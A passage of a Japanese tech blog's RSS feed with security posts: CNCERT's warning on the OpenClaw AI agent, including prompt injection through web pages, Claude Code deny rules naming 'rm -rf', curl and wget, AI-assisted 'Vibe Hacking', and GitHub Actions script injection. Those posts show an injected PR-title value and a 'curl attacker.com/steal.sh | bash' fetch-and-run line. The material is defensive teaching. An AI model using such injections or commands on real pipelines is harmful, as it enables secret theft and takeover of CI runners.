+&lt;p&gt;従来のアプローチは「脆弱性スキャン → CVSS スコアで優先順位付け → パッチ適用」というものでした。しかし現代の IT 環境では以下の課題があります。&lt;/p&gt;</description></item><item><title>中国政府が OpenClaw に緊急セキュリティ警告：AI エージェントの安全な運用とは</title><link>https://hdknr.github.io/blogs/posts/2026/03/openclaw-china-security-warning/</link><pubDate>Wed, 11 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/openclaw-china-security-warning/</guid><description>&lt;p&gt;オープンソースの AI エージェントフレームワーク「OpenClaw」の利用が中国国内で急拡大する中、中国の国家コンピュータネットワーク緊急対応技術チーム（CNCERT）が緊急のセキュリティ警告を発しました。政府機関や国有銀行での使用禁止にまで発展したこの問題について、技術的な背景と対策をまとめます。&lt;/p&gt;
+&lt;h2 id="何が起きたのか"&gt;何が起きたのか&lt;/h2&gt;
+&lt;p&gt;2026年3月、中国の CNCERT は OpenClaw について「極めて弱いデフォルトセキュリティ設定」を持つと警告を発しました。OpenClaw はローカルファイルシステムや環境変数へのアクセス、拡張機能のインストールなど高いシステム権限を付与されますが、デフォルトのセキュリティ設定が不十分であり、攻撃者がシステム全体の制御を容易に奪取できる状態であると指摘されています。&lt;/p&gt;
+&lt;p&gt;この警告を受けて、中国当局は政府機関と国有企業（主要銀行を含む）に対し、業務用コンピュータへの OpenClaw のインストールを禁止する通知を出しました。既にインストール済みの職員には、上司への報告・セキュリティチェック・必要に応じた削除が指示されています。&lt;/p&gt;
+&lt;h2 id="cncert-が指摘した主なリスク"&gt;CNCERT が指摘した主なリスク&lt;/h2&gt;
+&lt;h3 id="1-アーキテクチャ設計上の問題"&gt;1. アーキテクチャ設計上の問題&lt;/h3&gt;
+&lt;p&gt;OpenClaw はローカルファイルシステム、環境変数、シェルへの広範なアクセス権限を持ちます。これ自体は AI エージェントの機能として必要ですが、適切な制限なしに運用すると重大なリスクとなります。&lt;/p&gt;
+&lt;h3 id="2-デフォルト設定の脆弱性"&gt;2. デフォルト設定の脆弱性&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;管理 UI のデフォルトポート&lt;/strong&gt;がインターネットに公開可能な状態&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;環境変数に認証情報を平文で保存&lt;/strong&gt;する設定がデフォルト&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;スキルの自動更新&lt;/strong&gt;が有効な状態がデフォルト&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="3-プラグインエコシステムの危険性"&gt;3. プラグインエコシステムの危険性&lt;/h3&gt;
+&lt;p&gt;不正なプラグイン（ポイズンドプラグイン）を通じて、ユーザーのシステムに悪意あるコードが侵入するリスクがあります。プラグインのアクセス権限が十分に制限されていないことが問題視されています。&lt;/p&gt;
+&lt;h3 id="4-web-ベースの攻撃"&gt;4. Web ベースの攻撃&lt;/h3&gt;
+&lt;p&gt;悪意ある指示を Web ページに埋め込むことで、OpenClaw に不正な操作を実行させる攻撃（プロンプトインジェクション）が可能です。&lt;/p&gt;
+&lt;h3 id="5-重要データの誤削除"&gt;5. 重要データの誤削除&lt;/h3&gt;
+&lt;p&gt;AI エージェントの判断ミスにより、ユーザーが意図しない重要データの削除が発生するリスクも指摘されています。&lt;/p&gt;
+&lt;h2 id="cncert-の推奨対策"&gt;CNCERT の推奨対策&lt;/h2&gt;
+&lt;p&gt;CNCERT は以下の対策を推奨しています。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;コンテナで隔離実行する&lt;/strong&gt; — OpenClaw をホストシステムから隔離された環境で動作させる&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;管理ポートをインターネットに公開しない&lt;/strong&gt; — 管理 UI へのアクセスをローカルネットワークに限定する&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;認証情報を平文で環境変数に保存しない&lt;/strong&gt; — シークレット管理ツールを使用する&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;スキルの自動更新を無効にする&lt;/strong&gt; — 更新は手動で検証してから適用する&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;厳密な認証とアクセス制御を実装する&lt;/strong&gt; — 不要な権限を排除する&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;セキュリティアップデートへの追従を徹底する&lt;/strong&gt; — 既知の脆弱性に速やかに対応する&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id="ai-エージェント全般への教訓"&gt;AI エージェント全般への教訓&lt;/h2&gt;
+&lt;p&gt;この問題は OpenClaw に限った話ではありません。AI エージェントは本質的に高いシステム権限を必要とするため、以下の原則はどのエージェントツールにも当てはまります。&lt;/p&gt;</description></item><item><title>Claude Codeの「セキュリティ%表示」は対策ではなく"お気持ち表示"？ 本当にやるべきセキュリティ設定</title><link>https://hdknr.github.io/blogs/posts/2026/03/claude-code-security-theater/</link><pubDate>Tue, 10 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/claude-code-security-theater/</guid><description>&lt;p&gt;Claude Codeでツール実行のたびに「パスワード漏洩リスク: 0%」「悪意あるコード実行リスク: 0%」のようなセキュリティリスクのパーセンテージを表示させるCLAUDE.mdの設定がSNSで話題になった。これに対し、セキュリティエンジニアから「それは対策ではなくお気持ち表示」という指摘が上がり、議論を呼んでいる。&lt;/p&gt;
+&lt;h2 id="話題になったパーセンテージ表示"&gt;話題になった「パーセンテージ表示」&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://x.com/wan_line_"&gt;@wan_line_（ワン@AIのお兄さん）&lt;/a&gt;氏が2026年3月9日に投稿したポストでは、CLAUDE.mdに以下のようなルールを記述することが提案されていた:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ツール実行のたびに&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;パスワードが外に漏れる可能性: ○%&lt;/li&gt;
+&lt;li&gt;外部サーバーにデータが送られる可能性: ○%&lt;/li&gt;
+&lt;li&gt;悪意あるコードが動く可能性: ○%&lt;/li&gt;
+&lt;li&gt;PCの設定が書き換わる可能性: ○%&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Claude Codeで「yes連打」してしまうユーザー向けに、実行前にリスクを可視化してくれるという趣旨だ。&lt;/p&gt;
+&lt;h2 id="セキュリティ専門家の反論お気持ち表示"&gt;セキュリティ専門家の反論:「お気持ち表示」&lt;/h2&gt;
+&lt;p&gt;この投稿に対し、&lt;a href="https://x.com/sudachikawaii"&gt;@sudachikawaii（シンジ☁Shinji）&lt;/a&gt;氏が&lt;a href="https://x.com/sudachikawaii/status/2031304091486531843"&gt;反論した&lt;/a&gt;:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;セキュリティ屋から言うと、これは「対策」ではなく「お気持ち表示」です。LLMはコードの安全性を静的解析していないので、表示されるパーセンテージに技術的根拠がありません。&lt;/p&gt;
+&lt;p&gt;「0%」を見てyes押すのは、yes連打と同じです。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;指摘のポイントは明快だ:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;LLMは静的解析エンジンではない&lt;/strong&gt; — LLMが出すパーセンテージは、コードを構文解析して脆弱性を検出した結果ではなく、「それっぽい数値」を生成しているだけ&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;偽の安心感を与える&lt;/strong&gt; — 「0%」という表示を見てユーザーが安心してyesを押すなら、結局yes連打と変わらない&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;技術的根拠がない&lt;/strong&gt; — 実際のセキュリティリスク分析には、静的解析ツール（SAST）、依存関係チェック、ネットワーク通信の監視などが必要&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id="claude-codeに本当に効くセキュリティ対策"&gt;Claude Codeに本当に効くセキュリティ対策&lt;/h2&gt;
+&lt;p&gt;Claude Codeには、CLAUDE.mdの「お気持ちルール」よりもはるかに実効性のあるセキュリティ機能が組み込まれている。&lt;a href="https://code.claude.com/docs/ja/security"&gt;公式ドキュメント&lt;/a&gt;に基づき、本当にやるべき対策を整理する。&lt;/p&gt;
+&lt;h3 id="1-サンドボックスを有効にする"&gt;1. サンドボックスを有効にする&lt;/h3&gt;
+&lt;p&gt;最も重要な対策。Bashコマンドの実行をOSレベルで隔離し、ファイルシステムやネットワークへのアクセスを制限する。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;macOSではSeatbelt、LinuxではBubble Wrapが使用される&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/sandbox&lt;/code&gt; コマンドで有効化&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="2-denyルールで危険なコマンドをブロック"&gt;2. denyルールで危険なコマンドをブロック&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;permissions.deny&lt;/code&gt; に実行禁止コマンドを明示的に設定する。評価順は &lt;strong&gt;deny → ask → allow&lt;/strong&gt; で、denyが最優先。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;6
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;7
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;8
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;permissions&amp;#34;&lt;/span&gt;: {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;deny&amp;#34;&lt;/span&gt;: [
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Bash(command:rm -rf *)&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Bash(command:curl *)&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Bash(command:wget *)&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="3-機密ファイルへのアクセスを遮断"&gt;3. 機密ファイルへのアクセスを遮断&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;.env&lt;/code&gt; やシークレットファイルへのアクセスをブロックする。&lt;/p&gt;</description></item><item><title>Vibe Hacking とは何か：AI が変えるサイバー攻撃の新潮流</title><link>https://hdknr.github.io/blogs/posts/2026/03/vibe-hacking/</link><pubDate>Tue, 10 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/vibe-hacking/</guid><description>&lt;p&gt;「Vibe Coding」が開発者の間で広まる中、同じ発想をサイバー攻撃に応用する「Vibe Hacking」が新たな脅威として注目されている。AI を使って、専門知識がなくてもマルウェアや攻撃スクリプトを生成できる時代が到来した。&lt;/p&gt;
+&lt;h2 id="vibe-hacking-とは"&gt;Vibe Hacking とは&lt;/h2&gt;
+&lt;p&gt;Vibe Hacking は、AI を活用してサイバー攻撃のハードルを劇的に下げる手法・思想を指す。開発者が自然言語で AI にコードを書かせる「Vibe Coding」のダークサイドとも言える概念だ。&lt;/p&gt;
+&lt;p&gt;従来のハッキングには、ネットワークプロトコルの理解、脆弱性の発見、エクスプロイトコードの記述といった高度な技術スキルが必要だった。しかし Vibe Hacking では「ターゲットを指定するだけ」「経験不要」「AI が処理する」といった形で、技術的な障壁がほぼ消失する。&lt;/p&gt;
+&lt;h2 id="具体的な脅威"&gt;具体的な脅威&lt;/h2&gt;
+&lt;h3 id="ai-生成マルウェア"&gt;AI 生成マルウェア&lt;/h3&gt;
+&lt;p&gt;HP Wolf Security の脅威インサイトレポート（2025年10月〜12月）によると、攻撃者は AI で生成した感染スクリプトを実際の攻撃キャンペーンに使用している。偽のインボイス PDF を通じて、正規のプラットフォーム（Booking.com など）へリダイレクトする前にマルウェアをダウンロードさせる手口が確認されている。&lt;/p&gt;
+&lt;h3 id="flat-pack-malware"&gt;Flat-Pack Malware&lt;/h3&gt;
+&lt;p&gt;複数の無関係な脅威グループが、同一のモジュール化されたマルウェアコンポーネントを再利用する「Flat-Pack Malware」も増加している。市販のマルウェア部品を組み立てるだけで、最小限の労力でカスタマイズされた攻撃キャンペーンを展開できる。&lt;/p&gt;
+&lt;h3 id="国家レベルの活用"&gt;国家レベルの活用&lt;/h3&gt;
+&lt;p&gt;パキスタン系の脅威アクター「Transparent Tribe」が、AI コーディングツールを使ってマルウェアを「Vibe Coding」し、インド政府やその海外大使館を標的にした事例も報告されている。&lt;/p&gt;
+&lt;h2 id="なぜ危険なのか"&gt;なぜ危険なのか&lt;/h2&gt;
+&lt;h3 id="攻撃コストの劇的な低下"&gt;攻撃コストの劇的な低下&lt;/h3&gt;
+&lt;p&gt;脆弱性の発見からエクスプロイト作成までのコストは、かつて数週間と数千ドルを要した。AI によりこれがほぼゼロになりつつある。「スプレー＆プレイ」型の大規模攻撃ではなく、特定のシステムや企業、さらには個々の開発者をピンポイントで狙うマイクロターゲット攻撃が現実的になった。&lt;/p&gt;
+&lt;h3 id="検出回避能力の向上"&gt;検出回避能力の向上&lt;/h3&gt;
+&lt;p&gt;HP の調査では、メール脅威の 14% 以上がゲートウェイスキャナーを回避している。AI が生成するコードは毎回微妙に異なるため、シグネチャベースの検出が困難になっている。&lt;/p&gt;
+&lt;h3 id="vibe-coding-で作られたアプリの脆弱性"&gt;Vibe Coding で作られたアプリの脆弱性&lt;/h3&gt;
+&lt;p&gt;攻撃だけでなく、Vibe Coding で開発されたアプリケーション側も問題を抱えている。Veracode の GenAI コードセキュリティレポートによると、AI 生成コードの 45% にセキュリティ脆弱性が含まれている。AI はほぼ半分の確率で安全でない実装を選択する。&lt;/p&gt;
+&lt;h2 id="対策のポイント"&gt;対策のポイント&lt;/h2&gt;
+&lt;h3 id="ai-によるコードレビューの自動化"&gt;AI によるコードレビューの自動化&lt;/h3&gt;
+&lt;p&gt;Vibe Coding で生成された全コードを人間がレビューするのは現実的ではない。コード生成が AI なら、レビューも AI で自動化するのが自然な流れだ。&lt;/p&gt;</description></item><item><title>GitHub Actions スクリプトインジェクション完全解説 — ${{ }} を run に書いた瞬間、攻撃者にシェルを渡している</title><link>https://hdknr.github.io/blogs/posts/2026/03/1e29bea3f9f5cdf4a2b11eec4a2ab536/</link><pubDate>Fri, 06 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/1e29bea3f9f5cdf4a2b11eec4a2ab536/</guid><description>&lt;h1 id="github-actions-スクリプトインジェクション完全解説----を-run-に書いた瞬間攻撃者にシェルを渡している"&gt;GitHub Actions スクリプトインジェクション完全解説 — &lt;code&gt;${{ }}&lt;/code&gt; を &lt;code&gt;run&lt;/code&gt; に書いた瞬間、攻撃者にシェルを渡している&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://x.com/tmknom/status/2029512334218244121"&gt;『GitHub CI/CD実践ガイド』著者の tmknom 氏（@tmknom）&lt;/a&gt;が、GitHub Actions のスクリプトインジェクションを解説した Zenn 記事を引用し、こう呼びかけています。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;はい、というわけでしてね。みんな『GitHub CI/CD実践ガイド』を、穴が開くまで読んでくださいね！&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;引用されている &lt;a href="https://zenn.dev/kou_pg_0131/articles/gha-script-injection"&gt;kou_pg_0131 氏の Zenn 記事&lt;/a&gt;は、GitHub Actions の &lt;code&gt;run&lt;/code&gt; ステップで &lt;code&gt;${{ }}&lt;/code&gt; テンプレート式を使う際のインジェクション脆弱性を実演付きで解説した記事です。2025〜2026年にかけて GitHub Actions のサプライチェーン攻撃が急増しており、この知識はすべての開発者にとって必須になっています。&lt;/p&gt;
+&lt;h2 id="何が危険なのか--30秒で理解する"&gt;何が危険なのか — 30秒で理解する&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-yaml" data-lang="yaml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 危険なコード&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;- &lt;span style="color:#f92672"&gt;run&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;echo &amp;#34;PR title is ${{ github.event.pull_request.title }}&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;一見無害なこのコード。しかし攻撃者が PR タイトルに以下を入力すると、&lt;strong&gt;任意のコマンドが実行&lt;/strong&gt;されます。&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;#34;; echo INJECTED&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;展開後のシェルコマンドは以下になります。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;echo &lt;span style="color:#e6db74"&gt;&amp;#34;PR title is &amp;#34;&lt;/span&gt;; echo INJECTED&lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;セミコロンでコマンドが分割され、&lt;code&gt;echo INJECTED&lt;/code&gt; が実行されます。&lt;code&gt;echo&lt;/code&gt; の代わりに &lt;code&gt;curl attacker.com/steal.sh | bash&lt;/code&gt; を書けば、CI/CD ランナー上で&lt;strong&gt;リバースシェルの確立、シークレットの窃取、リポジトリの改ざん&lt;/strong&gt;が可能です。&lt;/p&gt;</description></item><item><title>GitHub Actionsスクリプトインジェクション完全解説 — ${{ }}をrunに書いた瞬間、攻撃が始まる</title><link>https://hdknr.github.io/blogs/posts/2026/03/5bbdc7bd98ff0dbdfde257d909d48d8c/</link><pubDate>Thu, 05 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/5bbdc7bd98ff0dbdfde257d909d48d8c/</guid><description>&lt;h1 id="github-actions-スクリプトインジェクション完全解説----を-run-に書いた瞬間攻撃が始まる"&gt;GitHub Actions スクリプトインジェクション完全解説 — &lt;code&gt;${{ }}&lt;/code&gt; を run に書いた瞬間、攻撃が始まる&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://x.com/koki_develop/status/2029339007013073368"&gt;@koki_develop 氏のポスト&lt;/a&gt;で紹介された Zenn 記事が話題になっています。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;書きました。GitHub Actions 触る人は全員知っておいてほしい&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href="https://zenn.dev/kou_pg_0131/articles/gha-script-injection"&gt;【GitHub Actions】スクリプトインジェクションの実践例&lt;/a&gt;（koki 氏）は、GitHub Actions ワークフローにおけるスクリプトインジェクションの仕組みを具体的なコード例で解説した記事です。「プライベートリポジトリなら大丈夫？」という疑問にも明確に「安全ではない」と回答しています。&lt;/p&gt;
+&lt;p&gt;2025 年には GhostAction キャンペーンで 3,325 件のシークレットが窃取され、tj-actions/changed-files のサプライチェーン攻撃では 23,000 以上のリポジトリが影響を受けました。スクリプトインジェクションは理論上の脅威ではなく、現在進行形のリスクです。&lt;/p&gt;
+&lt;h2 id="スクリプトインジェクションとは何か"&gt;スクリプトインジェクションとは何か&lt;/h2&gt;
+&lt;p&gt;GitHub Actions の &lt;code&gt;${{ }}&lt;/code&gt; 式は、&lt;strong&gt;シェルがコマンドを解析する前に&lt;/strong&gt;テンプレートエンジンによって展開されます。この順序が脆弱性の根本原因です。&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;通常の期待:
+${{ github.event.pull_request.title }} → 文字列として処理される
+実際の動作:
+${{ github.event.pull_request.title }} → 値がそのままシェルスクリプトに埋め込まれる
+→ シェルがコマンドとして解釈する
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;つまり、PR タイトルやブランチ名など攻撃者が制御可能な値が、そのままシェルコマンドの一部になります。&lt;/p&gt;
+&lt;h2 id="攻撃の実践例"&gt;攻撃の実践例&lt;/h2&gt;
+&lt;h3 id="攻撃-1-pr-タイトルによるインジェクション"&gt;攻撃 1: PR タイトルによるインジェクション&lt;/h3&gt;
+&lt;p&gt;脆弱なワークフロー:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;6
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;7
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-yaml" data-lang="yaml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;on&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;pull_request&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;jobs&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;example&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;runs-on&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;ubuntu-latest&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;steps&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; - &lt;span style="color:#f92672"&gt;run&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;echo &amp;#34;PR title is ${{ github.event.pull_request.title }}&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
